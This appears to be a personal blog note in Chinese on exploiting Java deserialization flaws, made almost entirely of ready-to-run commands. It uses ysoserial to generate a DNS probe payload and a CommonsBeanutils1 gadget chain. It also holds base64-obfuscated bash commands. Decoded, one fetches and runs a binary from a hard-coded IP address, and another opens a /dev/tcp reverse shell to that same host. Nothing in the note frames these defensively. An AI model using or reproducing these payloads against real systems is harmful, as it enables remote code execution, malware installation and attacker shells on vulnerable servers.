---
author: XhstormR
categories:
- Notes
date: 2021-01-27T16:40:13+08:00
title: Java 反序列化漏洞利用
---

<!--more-->

Updated on 2021-01-27

>

```bash
探测：
java -jar ysoserial-master-SNAPSHOT.jar URLDNS "http://y8jhkk.dnslog.cn" > URLDNS.bin

利用：
java -jar ysoserial-master-SNAPSHOT.jar CommonsBeanutils1 "bash -c {echo,d2dldCAtcU8gMTdLNm9NQzUgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSBodHRwOi8vNDcuOTguMTM1LjY1OjgwODAvbGpDUHh6dDsgY2htb2QgK3ggMTdLNm9NQzU7IC4vMTdLNm9NQzU=}|{base64,-d}|{bash,-i}" > CommonsBeanutils1.bin
```

```bash
转储为文本格式：
java -jar SerializationDumper-v1.13.jar -r CommonsBeanutils1.bin > CommonsBeanutils1.txt

还原为二进制流：
java -jar SerializationDumper-v1.13.jar -b CommonsBeanutils1.txt CommonsBeanutils1.ok.bin
```

```bash
计算 serialVersionUID -3490850999041592962 序列化后的值：
busybox printf "%016x" -3490850999041592962 |^
busybox fold -w2 |^
busybox paste -sd" "
----
cf 8e 01 82 fe 4e f1 7e
```

```bash
Shell 中执行命令：
bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45OC4xMzUuNjUvNDM5OSAwPiYx}|{base64,-d}|{bash,-i}'

Java 中执行命令：
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45OC4xMzUuNjUvNDM5OSAwPiYx}|{base64,-d}|{bash,-i}
```

## Reference
* https://github.com/frohoff/ysoserial
* https://github.com/zema1/ysoserial
* https://github.com/NickstaDB/SerializationDumper
* http://jackson-t.ca/runtime-exec-payloads.html
